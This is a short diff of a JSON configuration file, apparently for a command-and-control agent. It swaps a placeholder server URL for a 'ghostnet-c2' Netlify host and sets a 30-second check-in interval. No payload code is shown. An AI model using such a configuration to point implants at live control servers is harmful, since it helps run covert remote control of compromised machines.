@@ -1,5 +1,5 @@
 {
-  "c2_url": "https://your-netlify-site.netlify.app",
+  "c2_url": "https://ghostnet-c2.netlify.app",
   "c2_port": 443,
   "agent_id": "auto",
   "check_interval_seconds": 30,
